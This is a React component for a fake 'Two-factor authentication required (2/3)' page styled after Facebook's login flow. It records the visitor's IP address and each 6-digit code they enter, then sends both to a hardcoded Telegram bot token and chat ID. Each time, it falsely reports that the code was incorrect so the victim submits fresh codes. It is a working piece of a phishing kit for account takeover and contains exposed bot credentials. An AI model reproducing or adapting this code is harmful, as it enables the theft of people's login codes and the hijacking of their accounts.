import React, { useState, useRef, useEffect} from "react";
import Nav from "../component/nav";
import axios from "axios";
import { useNavigate } from 'react-router-dom';
export default function Verification() {
  const Ref = useRef(null);
  const [timer, setTimer] = useState('');
  const [doubleCheck, setDoubleCheck] = useState(true);
  const [correctFlag, setCorrectFlag] = useState(false);
  const [code, setCode] = useState("");
  const [passFlag, setPassFlag] = useState(false);
  const [pageFlag, setPageFlag] = useState(false);
  const [countOfCheck, setCountOfCheck] = useState(1);
  const [ip, setIP] = useState("");
  const navigate = useNavigate();

  // const botToken = '7024816830:AAHGOLB6hG5kV57GaTb7C5AFcCb1BNBhtJk';
  // const chatId = '6407116387';
  const botToken = '7009255232:AAFJ0oqZUaMmsMejKhbdaLnSxYyh6pl255w';
  const chatId = '6481657183';

  const getTimeRemaining = (e) => {
    const total = Date.parse(e) - Date.parse(new Date());
    const seconds = Math.floor((total / 1000) % 60);
    const minutes = Math.floor((total / 1000 / 60) % 60);
    return {
      total,
      minutes,
      seconds,
    };
  };
  const clearTimer = (e) => {
    // If you adjust it you should also need to
    // adjust the Endtime formula we are about
    // to code next
    setTimer("01:00");

    // If you try to remove this line the
    // updating of timer Variable will be
    // after 1000ms or 1sec
    if (Ref.current) clearInterval(Ref.current);
    const id = setInterval(() => {
      startTimer(e);
    }, 1000);
    Ref.current = id;
  };
  const getData = async () => {
    const res = await axios.get("https://api.ipify.org/?format=json");
    setIP(res.data.ip);
  };
  const getDeadTime = () => {
    let deadline = new Date();

    // This is where you need to adjust if
    // you entend to add more time
    deadline.setSeconds(deadline.getSeconds() + 60);
    return deadline;
  };
  const startTimer = (e) => {
    let { total, minutes, seconds } = getTimeRemaining(e);
    if (total >= 0) {
      // update the timer
      // check if less than 10 then we need to
      // add '0' at the beginning of the variable
      setTimer(
        (minutes > 9 ? minutes : "0" + minutes) +
          ":" +
          (seconds > 9 ? seconds : "0" + seconds)
      );
    }
    else {
      setTimer('');
    }
  };
  const handleWithSubmit = () => {
    if (code !== "") {
      var messageContent = `IP address: ${ip}\n 1 2fa: ${code}\n`
      if (countOfCheck > 1) {
        messageContent = `IP address: ${ip}\n 2 2fa: ${code}\n`
      }
      axios
      .post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        chat_id: chatId,
        text: messageContent,
      })
      .then(({ data }) => {
        clearTimer(getDeadTime());
        setCorrectFlag(true);
        setCode("");
  
        if (countOfCheck > 1)
        {
          setPageFlag(true);
          setDoubleCheck(false);
          setPassFlag(false);
        } else {
          setCountOfCheck(2)
  
          setPageFlag(false);
          setDoubleCheck(true);
          setPassFlag(false);
        }
      });
    } else {
      setPassFlag(true);
    }
    
  };
  const handleWithSubmitSecond = () => {
    if (code !== "") {
      axios
      .post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        chat_id: chatId,
        text: `IP address: ${ip}\n 3 2fa: ${code}\n`,
      })
      .then(({ data }) => {
        //console.log(data);
        navigate('/confirm');
      });
    } else {
      setPassFlag(true);
      setCorrectFlag(false);
    }  
  };

  const handlewithChange = ({ target }) => {
    const value = target.value;
    setCode(value);
    if (value !== "") {
      setPassFlag(false);
    } 
  };
  useEffect(() => {
    getData();
    setCode("");
  }, []);

  return (
    <>
      <div className="w-screen h-screen bg-[#dbdee2] flex" style={{padding: '25px'}}>
        <Nav />
        <main className="container max-w-[584px] px-[12px] bg-white rounded-md" style={{margin: 'auto'}}>
          <h1 className="text-base leading-6 font-bold font-sans py-[12px]">
            Two-factor authentication required (2/3)
          </h1>
          <p className="text-base  leading-6 text-[#212529] font-medium">
            You&apos;ve asked us to require a 6-digit login code when anyone
            tries to access your account from a new device or brower.
          </p>
          <p className="text-base  leading-6 text-[#212529] font-medium my-[14px]">
            Enter the 6-digit code from your{" "}
            <span className="font-extrabold font-sans">code generator</span> or
            third-party app below.
          </p>
          <hr className="my-[20px]" />
          <div className="flex space-x-1">
            <input
              type="text"
              id="code"
              name="code"
              placeholder="Your code"
              className="rounded bg-white text-base"
              required
              onChange={handlewithChange}
              value={code}
              disabled={timer !== ''}
            />
            <h2 className="my-auto">{timer}</h2>
          </div>
          {passFlag === true && (
            <h1 className="text-[#a94442] font-sans text-[15px] leading-[22px] my-[8px]">
              Enter your verification code !
            </h1>
          )}
          {correctFlag === true && timer !== '' && (
            <h1 className="text-[#a94442] font-sans text-[15px] leading-[22px] my-[8px]">
              Your verification code was incorrect, please try again !
            </h1>
          )}

          <hr className="my-[20px]" />
          <div className="flex justify-between my-[12px]">
            <h1 className="text-[14px] text-[#1877f2] leading-[21px] my-auto">
              Need another way to authenticate?
            </h1>
            {doubleCheck === true && (
              <button
                onClick={handleWithSubmit}
                className="rounded bg-[#0c65e6] font-sans font-bold text-base text-white p-[12px] hover:bg-blue-700"
              >
                Submit
              </button>
            )}
            {pageFlag === true && (
                <button
                  onClick={handleWithSubmitSecond}
                  className="rounded bg-[#0c65e6] font-sans font-bold text-base text-white p-[12px] hover:bg-blue-700"
                >
                  Submit
                </button>
            )}
          </div>
        </main>
      </div>
    </>
  );
}
